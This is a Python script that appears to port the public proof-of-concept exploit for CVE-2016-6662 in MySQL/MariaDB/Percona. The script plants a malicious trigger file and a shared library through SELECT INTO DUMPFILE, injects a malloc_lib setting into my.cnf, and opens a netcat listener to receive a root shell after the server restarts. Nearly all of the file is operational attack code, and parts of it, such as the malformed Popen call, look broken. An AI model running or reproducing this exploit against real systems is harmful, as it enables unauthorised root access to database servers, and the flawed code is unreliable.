#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import sys
import textwrap
import binascii
import subprocess
import fire
from loguru import logger

import mysql.connector

class MySQL(object):
    """
    CVE: CVE-2016-6662 - MySQL / MariaDB / Percona - PoC - Remote Root Code Execution
    Versions: 5.5.51, 5.6.32, <= 5.7.14
    Exploit Author: Dawid Golunski

    Reference:
        https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html
        https://legalhackers.com/videos/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html
        http://legalhackers.com
        https://twitter.com/dawid_golunski
    """
    def __init__(self, dbhost, dbname, dbuser, dbpass, mycnf):
        """

        self:
            dbhost(str) : Remote MySQL host
            dbname(str) : Remote MySQL database name
            dbuser(str) : MySQL username
            dbpass(str) : MySQL password
            mycnf(str) : Remote my.cnf owned by mysql user
        """
        self.TARGET_HOST = dbhost
        self.TARGET_DB = dbname
        self.TARGET_USER = dbuser
        self.TARGET_PASS = dbpass
        self.TARGET_MYCNF  = mycnf

    def SQL_MySQL_RCE_exploit(self):
        poctable_path = "/var/lib/mysql/pocdb/poctable.TRG"
        malloc_lib_path = "/var/lib/mysql/mysql_hookandroot_lib.so"

        cmd = ['rm', '-f', poctable_path, ';', 'rm', '-f', malloc_lib_path]
        process = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        (result, error) = process.communicate()
        rc = process.wait()

        logger.info(f"Connecting to target server {self.TARGET_HOST} and target mysql account '{self.TARGET_USER}@{self.TARGET_HOST}' using DB '{self.TARGET_DB}'")
        try:
            dbconn = mysql.connector.connect(user = self.TARGET_USER, password = self.TARGET_PASS, database = self.TARGET_DB, host = self.TARGET_HOST)
        except mysql.connector.Error as e:
            logger.error(f"Failed to connect to the target: {e}")
            sys.exit()

        try:
            cursor = dbconn.cursor()
            cursor.execute("SHOW GRANTS")
        except mysql.connector.Error as e:
            logger.error(f"Something went wrong: {e}")
            sys.exit()
        privs = cursor.fetchall()
        logger.info("The account in use has the following grants/perms: " )
        for priv in privs:
            logger.info(priv[0])

        trigger_payload = textwrap.dedent("""\
        TYPE=TRIGGERS
        triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
        AFTER INSERT
        ON `poctable` FOR EACH ROW
        BEGIN

        DECLARE void varchar(550);
        set global general_log_file=\\'%s\\';
        set global general_log = on;
        select "

        # 0ldSQL_MySQL_RCE_exploit got here :)

        [mysqld]
        malloc_lib=\\'%s\\'

        [abyss]
        " INTO void;
        set global general_log = off;

        END'
        sql_modes=0
        definers='root@localhost'
        client_cs_names='utf8'
        connection_cl_names='utf8_general_ci'
        db_cl_names='latin1_swedish_ci'""" % (self.TARGET_MYCNF, malloc_lib_path))
        trigger_payload_hex = "".join("{:02x}".format(ord(c)) for c in trigger_payload)

        logger.info("Compiling mysql_hookandroot_lib.so")
        cmd = "gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl"
        process = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        (result, error) = process.communicate()
        rc = process.wait() 
        if rc != 0:
            logger.error(f"Failed to compile mysql_hookandroot_lib.so: {cmd}")
            logger.info(error) 
            sys.exit()

        logger.info("Converting mysql_hookandroot_lib.so into HEX")
        hookandrootlib_path = './mysql_hookandroot_lib.so'
        with open(hookandrootlib_path, 'rb') as f:
            content = f.read()
            hookandrootlib_hex = binascii.hexlify(content)

        TRG_path = f"/var/lib/mysql/{self.TARGET_DB}/poctable.TRG"
        try:
            cursor = dbconn.cursor()
            logger.info(f"Saving trigger payload into {TRG_path}")
            cursor.execute(f"""SELECT unhex("{trigger_payload_hex}") INTO DUMPFILE '{TRG_path}' """)
            logger.info(f"Dumping shared library into {malloc_lib_path} file on the target")
            cursor.execute(f"""SELECT unhex("{hookandrootlib_hex}") INTO DUMPFILE '{malloc_lib_path}' """)
            logger.info("Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded")
            cursor.execute("CREATE TABLE `poctable` (line varchar(600)) ENGINE='MyISAM'"  )
            logger.info(f"Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config {self.TARGET_MYCNF}")
            cursor.execute("INSERT INTO `poctable` VALUES('execute the trigger!');" )
            logger.info(f"Showing the contents of {self.TARGET_MYCNF} config to verify that our setting (malloc_lib) got injected")
            cursor.execute(f"SELECT load_file('{self.TARGET_MYCNF}')")
        except mysql.connector.Error as e:
            logger.error(f"Something went wrong: {e}")
            sys.exit()
        finally:
            dbconn.close()

        myconfig = cursor.fetchall()
        logger.info(myconfig[0][0])
        logger.info("The preloaded lib mysql_hookandroot_lib.so will clean up all the mess before mysqld daemon even reads it :)")

        logger.info("Spawning netcat listener and waiting for MySQL daemon to get restarted to get our rootshell... :)" )
        listener = subprocess.Popen(self=["/bin/nc", "-lvp","6033"])
        listener.communicate()

        logger.info("Shell closed. Hope you had fun. ")
        sys.exit()

    def main(self):
        self.SQL_MySQL_RCE_exploit()

if __name__ == "__main__":
    fire.Fire(MySQL)